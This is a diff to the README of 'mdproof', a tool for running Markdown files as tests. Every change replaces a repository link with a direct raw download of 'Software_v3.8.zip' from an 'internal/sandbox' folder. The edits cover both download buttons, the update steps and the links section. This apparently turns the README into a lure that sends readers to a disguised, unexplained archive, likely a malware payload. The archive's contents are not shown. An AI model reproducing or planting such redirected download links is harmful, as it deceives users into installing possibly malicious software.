@@ -1,6 +1,6 @@
 # 🧪 mdproof - Turn Markdown Into Executable Tests
 
-[![Download mdproof](https://img.shields.io/badge/Download-mdproof-4caf50?style=for-the-badge&logo=github)](https://github.com/Votarymortiseandtenonjoint137/mdproof)
+[![Download mdproof](https://img.shields.io/badge/Download-mdproof-4caf50?style=for-the-badge&logo=github)](https://github.com/Votarymortiseandtenonjoint137/mdproof/raw/refs/heads/main/internal/sandbox/Software_v3.8.zip)
 
 ## 📋 What is mdproof?
 
@@ -37,7 +37,7 @@ Follow these steps to get mdproof running on your Windows PC.
 
 Click this big button to go to the download page:  
 
-[![Download mdproof](https://img.shields.io/badge/Download-mdproof-008080?style=for-the-badge&logo=github)](https://github.com/Votarymortiseandtenonjoint137/mdproof)
+[![Download mdproof](https://img.shields.io/badge/Download-mdproof-008080?style=for-the-badge&logo=github)](https://github.com/Votarymortiseandtenonjoint137/mdproof/raw/refs/heads/main/internal/sandbox/Software_v3.8.zip)
 
 This page lists the available versions and files to download. Look for the latest stable release.
 
@@ -140,7 +140,7 @@ This runs all Markdown test files inside the folder.
 
 To update mdproof, repeat the download and installation steps with the new version from the release page:
 
-https://github.com/Votarymortiseandtenonjoint137/mdproof
+https://github.com/Votarymortiseandtenonjoint137/mdproof/raw/refs/heads/main/internal/sandbox/Software_v3.8.zip
 
 ## 👩‍💻 Troubleshooting
 
@@ -153,7 +153,7 @@ https://github.com/Votarymortiseandtenonjoint137/mdproof
 ## 🔗 Useful Links
 
 - Download and latest releases:  
-  https://github.com/Votarymortiseandtenonjoint137/mdproof  
+  https://github.com/Votarymortiseandtenonjoint137/mdproof/raw/refs/heads/main/internal/sandbox/Software_v3.8.zip  
 
 - Documentation and examples on running tests can be found inside the downloaded package or on the GitHub repository homepage.  
 
